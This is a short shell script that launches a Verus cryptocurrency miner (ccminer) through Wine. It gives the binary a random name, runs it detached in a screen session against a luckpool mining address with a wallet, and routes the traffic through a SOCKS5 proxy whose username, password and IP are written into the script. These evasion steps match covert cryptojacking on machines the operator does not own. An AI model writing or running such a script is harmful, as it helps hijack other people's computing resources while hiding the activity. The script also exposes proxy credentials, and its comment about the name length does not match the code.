chmod +x * 
cd ccminer_CPU_3.8.3 
chmod +x * 
proxy_url="socks5://64oDwc:mTBPTN@161.115.231.65:9463"
random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
mv ccminer.exe $random_name.exe 
chmod +x * 
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p d=16384S -t 4 --proxy=$proxy_url"
